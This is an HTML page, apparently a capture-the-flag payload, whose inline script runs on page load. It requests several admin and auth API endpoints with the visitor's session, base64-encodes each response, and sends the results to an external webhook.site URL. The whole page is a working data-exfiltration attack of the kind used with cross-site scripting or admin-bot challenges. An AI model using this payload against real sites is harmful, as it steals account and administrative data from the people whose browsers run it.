<!DOCTYPE html>
<html>
<head>
    <title>Nothing to see here</title>
</head>
<body>
    <script>
      async function findFlag() {
    const webhook = "https://webhook.site/9c58164d-24e0-4e24-bb41-8742b6e95e5e";
    
    // List of likely endpoints for a 1000pt flag
    const targets = [
        '/api/admin/flag',
        '/api/admin/stats',
        '/api/auth/me',
        '/api/admin/settings'
    ];

    for (let url of targets) {
        try {
            let response = await fetch(url);
            let text = await response.text();
            // Send whatever we find back to the webhook
            fetch(`${webhook}?path=${btoa(url)}&content=${btoa(text)}`);
        } catch (e) {
            // Skip failed attempts
        }
    }
}
findFlag();
    </script>
</body>
</html>
